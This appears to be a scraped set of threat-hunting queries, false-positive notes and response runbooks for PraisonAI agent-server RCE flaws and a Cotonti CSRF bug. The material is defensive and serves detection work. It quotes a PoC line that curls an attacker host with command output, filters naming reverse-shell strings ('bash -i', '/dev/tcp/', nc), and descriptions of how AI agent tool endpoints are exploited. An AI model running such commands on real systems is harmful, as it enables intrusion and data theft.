1) TRIAGE: Confirm the host is actually serving recipes (look for a running 'praisonai ... recipe serve' process / listening port) and whether it is internet-facing (DeviceInfo.IsInternetFacing). A non-running package copy is low priority. 2) CONTAIN: On any internet-facing or shared host, enforce a secret immediately — set api_key:/jwt_secret: in the recipe YAML or export PRAISONAI_API_KEY/PRAISONAI_JWT_SECRET, and restart so the middleware fails closed; restrict the listener to localhost/VPN. 3) HUNT: Pivot to UC2 (unauthenticated /runs access) and UC3 (recipe-serve spawning shells) on the same DeviceId to determine whether the fail-open window was already abused.
DeviceFileEvents
| where Timestamp > ago(30d)
| where SHA256 == "491bf8f29e399418260810ba4bf0f6802c6e4aa675628e2be68a9726c15d9b23"
    or (FileName =~ "serve.py" and FolderPath has @"\praisonai\recipe\")
    or (FileName =~ "serve.py" and FolderPath has "/praisonai/recipe/")
| project Timestamp, DeviceName, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessAccountName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileSHA256 =~ "491bf8f29e399418260810ba4bf0f6802c6e4aa675628e2be68a9726c15d9b23"
    or (TargetFileName =~ "serve.py" and (TargetFilePath has @"\praisonai\recipe\" or TargetFilePath has "/praisonai/recipe/"))
| project TimeGenerated, DvcHostname, TargetFileName, TargetFilePath, TargetFileSHA256, ActorUsername, ActingProcessName
| order by TimeGenerated desc

Unauthenticated POST to PraisonAI recipe-serve /runs execution endpoint AIExploitation Medium
Detects requests reaching the praisonai recipe-serve execution path (/runs) with no authenticated user, the exact surface left open by the fail-open middleware. Catches an attacker triggering arbitrary recipe executions without an X-API-Key / Bearer token, including the rapid post-disclosure scanning PraisonAI endpoints have seen. Rationale: Pivots on the article's concrete execution path /runs (used in the PoC Request) plus POST method and the absence of an authenticated user (CsUsername empty/'-') — the direct fingerprint of a request the silently-disabled middleware forwarded. Defender side surfaces public inbound connections to the 'recipe serve' process when web-server logs aren't in XDR. Datadog/Falcon/CloudTrail left empty: FDR/Sysmon network events lack the request-path and auth-user context, and no web-access source is in scope. Corroborated by Sysdig/CSO reporting of sub-4h scanning of PraisonAI endpoints. Cross-checked against: • https://www.csoonline.com/article/4171215/praisonai-vulnerability-gets-scanned-within-4-hours-of-disclosure.html • https://webflow.sysdig.com/blog/cve-2026-44338-praisonai-authentication-bypass-in-under-4-hours-and-the-growing-trend-of-rapid-exploitation • https://docs.praison.ai/docs/deploy/deploy
ATT&CKT1190
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Internal load-balancer / health probes or uptime monitors hitting the service (note /health is always allowed by design — exclude it)
  • Legitimate clients where the front-end does not populate CsUsername even though an API key is validated downstream in the app
  • Vulnerability scanners / ASM tooling run by your own security team probing /runs
  • Authenticated internal automation calling /runs over a trusted network segment
Suppression filter
| where not(CIp startswith "10." or CIp startswith "192.168." or CIp startswith "172.16.")  // drop internal probes/monitors; keep external callers
Response runbook
1) TRIAGE: Check ScStatus on the /runs hits — 2xx means the recipe actually executed unauthenticated; pull the source IP, geo, and UserAgent and confirm whether the host's recipe YAML / env actually sets a secret (if not, every hit is a real bypass). 2) CONTAIN: Block the offending source IPs at the edge, take the recipe-serve listener off the public interface, and enforce api_key:/jwt_secret: so the middleware fails closed; rotate any secrets/data the recipes had access to. 3) HUNT: Correlate the same DeviceName/time window with UC3 (recipe-serve process spawning shells) and review recipe inputs/outputs for attacker-controlled prompts or exfil of operator data.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where ActionType == "InboundConnectionAccepted"
| where InitiatingProcessCommandLine has "praisonai"
    or (InitiatingProcessCommandLine has "recipe" and InitiatingProcessCommandLine has "serve")
| where RemoteIPType == "Public"
| summarize Connections=count(), FirstSeen=min(Timestamp), LastSeen=max(Timestamp), Ports=make_set(LocalPort)
          by DeviceName, RemoteIP, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName
| order by Connections desc
AppServiceHTTPLogs
| where TimeGenerated > ago(7d)
| where CsUriStem =~ "/runs"
| where CsMethod == "POST"
| where isempty(CsUsername) or CsUsername == "-"   // no authenticated principal == fail-open path reached
| summarize Requests=count(), FirstSeen=min(TimeGenerated), LastSeen=max(TimeGenerated), Statuses=make_set(ScStatus)
          by CIp, CsHost, CsUriStem, CsMethod, UserAgent
| order by Requests desc

| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Web.Web where (Web.url="*/runs*" OR Web.uri_path="/runs") Web.http_method=POST by Web.src Web.dest Web.url Web.http_method Web.status Web.user | `drop_dm_object_name(Web)` | where user="-" OR user="" OR isnull(user) | convert ctime(firstTime) ctime(lastTime) | sort - count
PraisonAI recipe-serve agent process spawning command/script interpreter (post-bypass RCE) AIExploitation Medium
Detects the python/uvicorn process running 'praisonai recipe serve' spawning a shell or scripting interpreter — the code-execution outcome when an attacker reaches a tool-wired recipe through the fail-open auth surface. This is the RCE path the advisory calls out (recipes wired to code execution / file-system / browser automation). Rationale: Pivots on the article's specific parent context (python running 'recipe serve'/'praisonai') spawning interpreters, the documented RCE path where recipes are wired to code execution. Parent cmdline pins the praisonai context on Defender/Sentinel/Sysmon/Datadog; Falcon's ProcessRollup2 schema lacks ParentCommandLine, so it is intentionally broad (python->shell) and meant to be scoped by the host found in UC1. CloudTrail empty (endpoint detection). Cross-checked against: • https://github.com/advisories/GHSA-6rmh-7xcm-cpxj • https://webflow.sysdig.com/blog/cve-2026-44338-praisonai-authentication-bypass-in-under-4-hours-and-the-growing-trend-of-rapid-exploitation
ATT&CKT1059 T1190
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate code-execution recipes (a built-in feature) where the agent intentionally shells out to run generated code
  • Browser-automation recipes spawning chromium/node (excluded from the interpreter list, but adjacent activity)
  • Operator running praisonai interactively in a dev environment and triggering shell tools
  • Package/venv setup steps under the same python process invoking sh/cmd at startup
Suppression filter
| where ProcessCommandLine has_any ("whoami","curl","wget","Invoke-WebRequest","base64","/tmp/","-enc ","nc ","bash -i")  // keep only child commands with recon/download/encoding intent; drop benign recipe code-exec
Response runbook
1) TRIAGE: Inspect the child ProcessCommandLine — generated code that matches the operator's expected recipe is benign; recon/download/encoded commands (whoami, curl, base64, /tmp writes) on an internet-facing recipe-serve host is a confirmed RCE. Confirm whether the host enforces an auth secret. 2) CONTAIN: Isolate the host, kill the recipe-serve process, take the listener off the public interface, and rotate any credentials/keys reachable from the recipe's tool environment. 3) HUNT: From the same DeviceId pull subsequent persistence (UC autostart writes), outbound C2 (DeviceNetworkEvents to public IPs from the python parent), and correlate back to the UC2 /runs source IP to scope the intrusion.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName has_any ("python.exe","python3.exe","python3","python","pythonw.exe","uvicorn.exe")
| where InitiatingProcessCommandLine has "praisonai"
    or (InitiatingProcessCommandLine has "recipe" and InitiatingProcessCommandLine has "serve")
| where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe","bash.exe","bash","sh","wscript.exe","cscript.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has_any ("python.exe","python3","pythonw.exe","uvicorn.exe","python")
| where ParentProcessCommandLine has "praisonai"
    or (ParentProcessCommandLine has "recipe" and ParentProcessCommandLine has "serve")
| where ActingProcessName has_any ("cmd.exe","powershell.exe","pwsh.exe","bash","sh","wscript.exe","cscript.exe")
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("491bf8f29e399418260810ba4bf0f6802c6e4aa675628e2be68a9726c15d9b23") or SHA1 in~ ("491bf8f29e399418260810ba4bf0f6802c6e4aa675628e2be68a9726c15d9b23") or MD5 in~ ("491bf8f29e399418260810ba4bf0f6802c6e4aa675628e2be68a9726c15d9b23")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("491bf8f29e399418260810ba4bf0f6802c6e4aa675628e2be68a9726c15d9b23") or SHA1 in~ ("491bf8f29e399418260810ba4bf0f6802c6e4aa675628e2be68a9726c15d9b23") or MD5 in~ ("491bf8f29e399418260810ba4bf0f6802c6e4aa675628e2be68a9726c15d9b23")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["491bf8f29e399418260810ba4bf0f6802c6e4aa675628e2be68a9726c15d9b23"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).

Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] PraisonAI Jobs-API RCE: agent server (python) spawns shell/network utility via execute_command · Article-specific behavioural hunt — [GHSA / CRITICAL] GHSA-4869-x4pr-q22x: PraisonAI: Unauthenticated RCE via Jobs A

PraisonAI Jobs-API RCE: agent server (python) spawns shell/network utility via execute_command AIExploitation High
Hunts the landing of GHSA-4869-x4pr-q22x: the PraisonAI Jobs API process executing OS commands through the execute_command tool, which ends in subprocess.Popen (shell_tools.py:33). Surfaces a praisonai-hosting python/uvicorn parent spawning curl/sh/bash/nc/python children — the exact behaviour of the PoC `curl http://<ATTACKER>/pwn?output=$(id)`. Rationale: Anchors on the article's exact chain: praisonai Jobs API -> execute_command -> shell_tools.py subprocess.Popen, and the PoC's curl callback. Parent-cmdline 'praisonai' + shell/network child is high-fidelity because an agent server should not be forking curl/sh outside the abused tool. Falcon cannot filter parent command line in the documented ProcessRollup2 schema, so it anchors on parent python + child binary (slightly broader). Cross-checked against: • https://github.com/advisories/GHSA-4869-x4pr-q22x • https://www.sysdig.com/blog/cve-2026-44338-praisonai-authentication-bypass-in-under-4-hours-and-the-growing-trend-of-rapid-exploitation • https://github.com/advisories/GHSA-6rmh-7xcm-cpxj • https://cybersecuritynews.com/praisonai-vulnerability-exploited/
ATT&CKT1190 T1059.004
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate agentic workflows that intentionally enable execute_command to run curl/wget for data retrieval
  • Operators or CI pipelines launching praisonai from a shell, where the shell itself is the recorded parent
  • Health-check or self-test scripts bundled with the deployment that invoke curl against localhost
  • Container entrypoints where python supervises curl/sh for readiness probes
Response runbook
1) Triage: pull the full process tree on the host — confirm the parent is the praisonai Jobs API (port 8005 listener) and inspect the child ChildCmd for outbound URLs, command substitution output, or recon commands (id/whoami/uname). 2) Contain: isolate the host, kill the agent server process, and block the egress destination seen in the child command line; rotate any credentials/API keys reachable from that host. 3) Hunt: review web/proxy logs for POST /api/v1/runs from the same source IP (UC2), search other praisonai hosts for the same parent->shell pattern, and grep submitted YAML/app logs for the string 'approve' listing execute_command.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessCommandLine has "praisonai" or InitiatingProcessFolderPath has "praisonai"
| where FileName in~ ("curl","curl.exe","wget","sh","bash","dash","zsh","ksh","nc","ncat","socat","perl","ruby","php","python","python3","whoami","id","cmd.exe","powershell.exe","pwsh.exe")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentCmd = InitiatingProcessCommandLine,
          ChildImage = FolderPath,
          ChildCmd = ProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessCommandLine has "praisonai"
| where ActingProcessName has_any ("curl","wget","sh","bash","dash","zsh","ksh","nc","ncat","socat","perl","ruby","php","python","python3","whoami","id","cmd.exe","powershell","pwsh")
| project TimeGenerated, DvcHostname, ActorUsername,
          ParentProcessName, ParentProcessCommandLine,
          ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc
title: PraisonAI agent server spawning shell or network utility (Jobs API RCE)
id: 5f3b9c2a-7d41-4e8b-9c10-2a6e1f4b8d37
status: experimental
description: Detects a PraisonAI Jobs API host (python/uvicorn parent whose command line references praisonai) spawning a shell or network utility, the landing behaviour of the unauthenticated RCE in GHSA-4869-x4pr-q22x where execute_command reaches subprocess.Popen.
references:
  - https://github.com/advisories/GHSA-4869-x4pr-q22x
  - https://www.sysdig.com/blog/cve-2026-44338-praisonai-authentication-bypass-in-under-4-hours-and-the-growing-trend-of-rapid-exploitation

level: high
#event_simpleName=ProcessRollup2 ParentBaseFileName=/^(python|python3|uvicorn|gunicorn)$/i ImageFileName=/\/(curl|wget|nc|ncat|socat|bash|sh|dash|whoami|id|perl|ruby|php)$/i

Unauthenticated POST to PraisonAI Jobs API (/api/v1/runs, port 8005) AIDelivery Medium
Hunts inbound requests to the credential-less PraisonAI Jobs endpoint POST /api/v1/runs on its default port 8005 — the unauthenticated entry point of GHSA-4869-x4pr-q22x. Mass-scanning of this exact endpoint was reported within hours of disclosure, so external callers are a strong pre-exploit signal. Rationale: Uses the article's concrete endpoint (POST /api/v1/runs) and documented default port 8005. The WAF/proxy query catches the path+method exactly; the Defender/Falcon network queries surface external callers reaching the Jobs API listener when no L7 logging exists. Datadog relies on free-text syslog because no dedicated web-access source is available in this tenant's schema. Cross-checked against: • https://github.com/advisories/GHSA-4869-x4pr-q22x • https://www.sysdig.com/blog/cve-2026-44338-praisonai-authentication-bypass-in-under-4-hours-and-the-growing-trend-of-rapid-exploitation • https://cybersecuritynews.com/praisonai-vulnerability-exploited/
ATT&CKT1190
Data sourcesWeb.Web Network_Traffic.All_Traffic
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate internal automation or schedulers that submit jobs to /api/v1/runs
  • Uptime/health monitoring probes hitting the Jobs API endpoint
  • Authorized internal load testing of the agent platform
  • Corporate proxy or API gateway aggregating many users' calls behind a single source IP
Suppression filter
| where RequestClientApplication !has "HealthCheck" and RequestClientApplication !has "kube-probe"
Response runbook
1) Triage: identify the SourceIP — is it internal/known-automation or external? Check the user agent (scanners self-identify, e.g. CVE-Detector/1.0) and whether the same IP hit the endpoint repeatedly or from a hosting/VPS ASN. 2) Contain: if external/unknown, block the source at the WAF/edge and require auth on the Jobs API (apply Fix 1 — Depends(verify_token)); restrict 8005 to an allowlist. 3) Hunt: correlate the timestamp with UC1 process-spawn events on the destination host to confirm whether a request led to command execution, and review request bodies/app logs for the 'approve: [execute_command]' bypass payload.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where ActionType == "InboundConnectionAccepted"
| where LocalPort == 8005
| where InitiatingProcessCommandLine has "praisonai" or InitiatingProcessFileName in~ ("python","python3","uvicorn","gunicorn")
| where RemoteIPType == "Public"
| summarize Connections = count(), FirstSeen = min(Timestamp), LastSeen = max(Timestamp) by DeviceName, RemoteIP, LocalPort, InitiatingProcessFileName
| order by Connections desc
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where RequestMethod =~ "POST"
| where RequestURL has "/api/v1/runs"
| project TimeGenerated, DeviceVendor, DeviceProduct, SourceIP, DestinationIP, DestinationPort, RequestMethod, RequestURL, RequestClientApplication
| order by TimeGenerated desc
source:linux.syslog ("POST /api/v1/runs" OR "/api/v1/runs")

| table([@timestamp, aid, ComputerName, RemoteAddressIP4, RemotePort, LocalPort, ContextImageFileName, ContextProcessId])
WEB
Toggle if your env has no CIM data-model acceleration.

| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Web.Web where Web.http_method="POST" AND Web.url="*/api/v1/runs*" by Web.src Web.dest Web.dest_port Web.http_method Web.url Web.http_user_agent Web.status | `drop_dm_object_name(Web)` | convert ctime(firstTime) ctime(lastTime) | sort - lastTime
Exposure hunt: vulnerable PraisonAI package installed (praisonai <= 4.6.48 / praisonaiagents < 1.6.59) AIReconnaissance Medium
Inventory-side hunt for hosts running the versions affected by GHSA-4869-x4pr-q22x (no patched release at disclosure). Identifies the attack surface so the Jobs API can be authenticated/firewalled before mass-scanners reach it. Rationale: Uses the article's exact affected version boundaries (praisonai <= 4.6.48, praisonaiagents < 1.6.59) for a precise exposure query. parse_version gives correct semantic comparison rather than lexical string compare. Low FP because the package name + version range are specific to the advisory. Cross-checked against: • https://github.com/advisories/GHSA-4869-x4pr-q22x • https://advisories.gitlab.com/pkg/pypi/praisonai/CVE-2026-39890/ • https://github.com/advisories/GHSA-6rmh-7xcm-cpxj
ATT&CKT1190
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Air-gapped or internal-only dev boxes where the Jobs API is not network-exposed (vulnerable but lower risk)
  • Hosts where praisonai is installed in a virtualenv that TVM reports but the Jobs API service is never started
  • Version strings with local/build suffixes that parse_version may normalize unexpectedly
  • Decommissioned hosts still appearing in the inventory snapshot
Response runbook
1) Triage: for each hit, confirm whether the Jobs API is actually running and internet-reachable (check listener on 8005 and edge exposure) — prioritize internet-facing hosts. 2) Contain: since no fixed version exists, apply mitigations — enforce Depends(verify_token) on the Jobs router, restrict the 'approve' YAML field to a safe allowlist, and firewall 8005 to trusted callers. 3) Hunt: on every exposed host, run UC1 and UC2 retroactively to determine whether the endpoint was already probed or commands already executed.
DeviceTvmSoftwareInventory
| where SoftwareName has "praisonai"
| extend ParsedVersion = parse_version(SoftwareVersion)
| where (SoftwareName =~ "praisonai" and ParsedVersion <= parse_version("4.6.48"))
    or (SoftwareName =~ "praisonaiagents" and ParsedVersion < parse_version("1.6.59"))
| project DeviceName, SoftwareVendor, SoftwareName, SoftwareVersion, OSPlatform, EndOfSupportStatus
| order by DeviceName asc
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where SoftwareName has "praisonai"
| project TimeGenerated, DeviceName, SoftwareVendor, SoftwareName, SoftwareVersion, CveId, VulnerabilitySeverityLevel
| order by TimeGenerated desc

Exposed PraisonAI MCP SSE listener accepting non-loopback connections AIDelivery Medium
Hunts a PraisonAI Python/uvicorn MCP server (run_sse / launch_tools_mcp_server) that bound to 0.0.0.0 and is accepting inbound TCP connections from anything other than localhost. Per GHSA-x227-pf99-vffg the SSE transport ships with no auth and no Origin check, so any non-loopback reachability is the exploitable exposure precondition. Rationale: Anchors on the article's exact exposure: a praisonai-tagged Python/uvicorn process (InitiatingProcessCommandLine has 'praisonai') accepting inbound connections from a non-loopback peer — exactly the 0.0.0.0 default + no-auth condition GHSA-x227-pf99-vffg flags. Falcon variant can only anchor on python (no parent-cmdline field in FDR) so it is broader. Cross-checked against: • https://cybersecuritynews.com/praisonai-vulnerability-exploited/ • https://www.csoonline.com/article/4171215/praisonai-vulnerability-gets-scanned-within-4-hours-of-disclosure.html • https://www.ibm.com/support/pages/node/7268889 • https://attack.mitre.org/techniques/T1190/
ATT&CKT1190 T1133
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Intentional internal deployment where the MCP server is reachable on the LAN for legitimate multi-host agent orchestration
  • Container/k8s networking where the peer IP is a sidecar or service-mesh proxy rather than localhost
  • Local health-check/monitoring agent probing the port from the host's primary NIC IP instead of 127.0.0.1
  • Developer testing the SSE endpoint from a second machine on the same subnet
  • Reverse proxy on a separate host fronting the MCP server (auth may be enforced at the proxy)
Suppression filter
| where not(ipv4_is_match(RemoteIP, "10.0.0.0/8") or ipv4_is_match(RemoteIP, "172.16.0.0/12") or ipv4_is_match(RemoteIP, "192.168.0.0/16"))  // keep only non-RFC1918 peers if internal LAN reach is sanctioned
Response runbook
1) Triage: confirm the process is a PraisonAI MCP SSE server and check the bind address and version (praisonaiagents < 1.6.59 is vulnerable); enumerate the RemoteIPs that reached it and whether they are expected operators. 2) Contain: firewall the listening port to localhost / trusted CIDRs, restart the server bound to 127.0.0.1, and upgrade praisonaiagents to >= 1.6.59 (which wires in SecurityConfig). 3) Hunt: pivot on the same host for tools/call traffic (UC2) and for the MCP Python process spawning shells/file writes (UC3) indicating the exposure was already exploited.

| where Timestamp > ago(7d)
| where ActionType == "InboundConnectionAccepted"
| where InitiatingProcessFileName has_any ("python","python3","python.exe","uvicorn")
| where InitiatingProcessCommandLine has "praisonai"
| where not(ipv4_is_match(RemoteIP, "127.0.0.0/8")) and RemoteIP != "::1"
| summarize Connections=count(), RemoteIPs=make_set(RemoteIP,20), FirstSeen=min(Timestamp), LastSeen=max(Timestamp) by DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, LocalPort
| order by Connections desc

Unauthenticated MCP SSE JSON-RPC tool invocation (/sse + /messages/ no Authorization) AIExploitation High
Hunts the GHSA-x227-pf99-vffg exploitation traffic: an SSE handshake on /sse followed by JSON-RPC POSTs to /messages/?session_id=<sid> carrying no Authorization header. This is the unauthenticated tools/list + tools/call path that yields RCE on PraisonAI servers exposing file/shell/code-exec tools. Rationale: Uses the exact PoC URIs from the advisory (/sse handshake then /messages/?session_id=) plus the article's 'No Authorization header anywhere' invariant (ImWebSession HttpRequestHeaderAuthorization is empty) — a highly specific, low-FP signature. Defender has no inbound HTTP-URL/header table for a server, so defender_kql is intentionally empty; Datadog/Falcon/CloudWatch omitted as they don't ship this reverse-proxy URL+header telemetry. Cross-checked against: • https://cybersecuritynews.com/praisonai-vulnerability-exploited/ • https://www.ibm.com/support/pages/node/7268889 • https://www.vulncheck.com/advisories/microsoft-playwright-mcp-server-dns-rebinding-via-missing-origin-header-validation • https://attack.mitre.org/techniques/T1190/
ATT&CKT1190 T1189
Data sourcesWeb
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A legitimate MCP client (e.g. an internal agent orchestrator) that genuinely doesn't send Authorization because the deployment intentionally runs without auth on a trusted segment
  • Uptime/synthetic monitoring hitting /sse to verify the endpoint is alive
  • Security scanner or internal pentest probing the MCP endpoints
  • An MCP client that authenticates via a cookie or query-string token rather than the Authorization header
  • Another product unrelated to PraisonAI that happens to expose a /sse path (filter by DstHostname/port)
Suppression filter
| where SrcIpAddr !in ("10.0.0.5")  // exclude sanctioned internal MCP orchestrator/monitoring source IPs once identified during tuning
Response runbook
1) Triage: confirm DstHostname/port is a PraisonAI MCP server and inspect the request sequence — an initialize -> tools/list -> tools/call progression from an external SrcIpAddr with no auth is a live exploit. 2) Contain: block the source IP at the proxy/WAF, take the MCP server offline or rebind to 127.0.0.1, and upgrade praisonaiagents to >= 1.6.59. 3) Hunt: on the server host look for shell/code-exec children of the MCP Python process (UC3), new files written by it, and outbound C2; review which tools were registered to scope blast radius.
ImWebSession
| where TimeGenerated > ago(7d)
| where (Url has "/messages/" and Url has "session_id=") or (Url has "/sse")
| where isempty(HttpRequestHeaderAuthorization)
| summarize Requests=count(), Methods=make_set(HttpMethod,5), StatusCodes=make_set(HttpStatusCode,5), Urls=make_set(Url,10), FirstSeen=min(TimeGenerated), LastSeen=max(TimeGenerated) by SrcIpAddr, DstIpAddr, DstHostname
| where Requests > 1
| order by Requests desc

PraisonAI MCP Python server spawning a command shell (unauth tools/call RCE) AIInstallation Medium
Hunts the RCE realization of GHSA-x227-pf99-vffg: a PraisonAI Python/uvicorn MCP process (parent command line contains 'praisonai') spawning an OS shell (sh/bash/cmd/powershell). With file/shell/code-exec tools registered, an unauthenticated tools/call executes commands as a child of the agent process. Rationale: Anchors on the article's RCE statement ('with file/shell/code-exec tools this is RCE') by tying a praisonai-tagged Python/uvicorn parent (InitiatingProcessCommandLine/ParentProcessCommandLine has 'praisonai') to a shell child. Falcon FDR lacks a parent-cmdline field so its variant is python->shell only (broader); Datadog windows.sysmon covers Windows only, so Linux agent hosts need the Defender/ImProcessCreate variants. Cross-checked against: • https://cybersecuritynews.com/praisonai-vulnerability-exploited/ • https://www.ibm.com/support/pages/node/7268889 • https://attack.mitre.org/techniques/T1059/004/
ATT&CKT1059.004 T1059.001 T1190
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • PraisonAI agents that legitimately use a code-interpreter or shell tool as part of their designed workflow
  • A python agent launching git/build subcommands via a shell wrapper during normal operation
  • Data-science notebooks or scripts under a path containing 'praisonai' invoking shell utilities
  • Operator running maintenance commands from the same venv whose argv contains 'praisonai'
  • CI jobs executing the praisonai CLI that shell out to test harnesses
Suppression filter
| where ProcessCommandLine has_any ("whoami","/bin/sh -c","-c ","curl ","wget ","bash -i","nc ","/dev/tcp/","powershell -e","Invoke-WebRequest")  // focus on shell children carrying recon/download/reverse-shell intent
Response runbook
1) Triage: inspect the child ProcessCommandLine — recon (whoami/id/curl), download, or reverse-shell strings against a server-side agent that should not be running interactive shells is a strong true positive; correlate timing with UC2 tools/call traffic. 2) Contain: isolate the host, kill the MCP server process tree, rotate any credentials/tokens accessible to the agent's service account, and rebind/upgrade praisonaiagents to >= 1.6.59. 3) Hunt: enumerate files written and network connections by the python parent, check for persistence (cron/systemd/Run keys) and lateral movement from the host, and review all registered MCP tools to bound capability abuse.

| where InitiatingProcessCommandLine has "praisonai"
| where FileName in~ ("sh","bash","dash","zsh","cmd.exe","powershell.exe","pwsh")
| where AccountName !endswith "$"

Cotonti CVE-2026-55742 CSRF rights update missing anti-CSRF token (x=) AIExploitation Medium
Hunts forged state-changing requests to the Cotonti admin rights handler (admin.php?m=rights&a=update) that lack the cot_check_xg anti-CSRF token (the x= parameter). Because the 'update' action never calls cot_check_xg(), a request that reaches a=update without a valid x= token is the exploitation signature for CVE-2026-55742 granting elevated group rights. Rationale: Anchored on the article's exact vulnerable endpoint (system/admin/admin.rights.php → admin.php?m=rights with a=update) and the named CSRF validator cot_check_xg, which is bypassed; cross-checked against Cotonti docs confirming admin.php?m=<module> routing and that the anti-CSRF token rides as the x= parameter ($sys['xk']). Absence of x= on a successful a=update is high-fidelity because the legitimate admin UI always emits the token. Cross-checked against: • https://github.com/advisories/GHSA-7g3p-35vc-mgjr • https://www.cotonti.com/docs/en/admin/url_modification • https://www.cotonti.com/docs/ext/extensions/global_vars
ATT&CKT1098 T1068
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Authorized DAST/pentest tooling (Burp, OWASP ZAP, Nikto) replaying admin.php?m=rights&a=update without the token
  • Bookmarked or hand-edited admin URL that omits the x= token
  • Browser prefetch/extension re-issuing a stripped URL
  • Uptime/monitoring crawlers hitting admin paths
  • Log pipeline that drops or normalises the x query parameter
Suppression filter
| where HttpStatusCode !in ("401","403","404")
Response runbook
1) Triage: pull the src IP, Referer and User-Agent for the flagged a=update request; confirm whether it returned 200/302 (succeeded) and whether the source IP matches a known admin workstation or an external/unknown host. 2) Contain: if external or unrecognised, force-logout the targeted admin session, reset that admin's credentials, and audit cot group rights for unexpected grants (especially additions via cot_auth_add_group) — revert any unauthorised group privilege changes. 3) Hunt: review subsequent activity from the same admin/session for template or config edits and for web-server processes spawning interpreters (see paired RCE UC); patch Cotonti above 1.0.0 / commit f43f1fc3.
ImWebSession
| where TimeGenerated > ago(7d)
| where Url contains "admin.php" and Url contains "m=rights" and Url contains "a=update"
| where not(Url contains "&x=" or Url contains "?x=")   // forged request lacks cot_check_xg token
| where HttpStatusCode !in ("401","403","404")          // keep requests that actually reached the handler
| project TimeGenerated, SrcIpAddr, DvcHostname, Url, HttpMethod, HttpStatusCode, Referer = HttpRequestHeaderReferer, UserAgent = HttpRequestHeaderUserAgent
| order by TimeGenerated desc

Cotonti web-server process spawning shell after CVE-2026-55742 admin takeover AIInstallation Medium
Hunts PHP/web-server processes (php, php-cgi, w3wp, httpd, nginx) spawning a command interpreter or recon utility — the code-execution stage the advisory warns about once an attacker uses the CSRF privilege escalation to reach the admin template/config editor. Distinct pivot from the web-log CSRF detection: this fires on endpoint process telemetry. Rationale: Grounded in the advisory's explicit statement that admin compromise 'can be further leveraged toward remote code execution' via template/config modification; the highest-fidelity host signal of that outcome is the Cotonti PHP/web-server runtime spawning a shell or recon binary, which never happens in normal Cotonti operation. Process names (php, php-cgi, w3wp, httpd, nginx) are the standard hosts for composer:cotonti/cotonti. Cross-checked against: • https://github.com/advisories/GHSA-7g3p-35vc-mgjr
ATT&CKT1505.003 T1059
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • PHP legitimately shelling out for image processing (ImageMagick convert/magick) or PDF/thumbnail generation
  • Web user running sendmail/mail wrappers for outbound notifications
  • Deployment or update tooling (composer, git pull) executing under the web-server account
  • Cron/backup scripts running as the web user that spawn sh/cmd
  • Monitoring or APM agents injecting helper processes into the web runtime
Suppression filter
